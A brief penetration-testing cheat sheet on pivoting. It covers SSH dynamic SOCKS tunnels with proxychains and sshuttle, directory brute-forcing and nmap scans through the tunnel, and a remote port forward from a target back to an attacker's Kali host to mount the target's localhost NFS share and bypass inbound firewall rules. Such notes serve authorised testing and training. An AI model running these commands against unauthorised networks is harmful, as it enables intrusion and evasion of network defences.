# Port Forwarding Techniques

### Guides

Tunneling and Pivoting Techniques (GIAC): https://www.giac.org/paper/gwapt/4686/tunneling-pivoting-web-application-penetration-testing/120229

### Dynamic Port Forwarding

This will allow you to access internal network services on dynamic (as opposed to static) ports.

Proxychains
1. Ensure `/etc/proxychains4.conf` is setup with the preferred port (deafult is `9050`).
2. Establish SSH tunnel with proxy server `$ kali> sudo ssh -N -D 127.0.0.1:9050 username@proxy_server/jump_box`
3. Run commands `$ proxychains curl http://[internal_target]`

Sshuttle
```
$ sshuttle user@[proxy_server] [internal_cidr]
$ sshuttle hello@10.11.1.251 10.1.1.0/24
```

Directory brute-force example
* Wfuzz works well, Gobuster requires some setup.
```
$ wfuzz -p 127.0.0.1:9050:SOCKS4 -c -w [/path/to/wordlist] --hc=404 http://[internal_target]/FUZ
```

Nmap scanning via. Proxychains example
```
$ proxychains nmap -Pn -sT -sV [target]
```

### Remote Port Forwarding

SSH remote port forwarding is for opening a connection from within the target -> Kali.
* Can bypass inbound firewall restrictions to SSH (as outbound connection is used).
* Can be used to access a target's localhost services from Kali (see NFS below)
```
# Mount a target's localhost NFS share
$ target> ssh -N -R [kali]:2049:127.0.0.1:2049 kali@[kali_ip]
$ kali> mount -t nfs 127.0.0.1:/ /mnt -o nolock
```
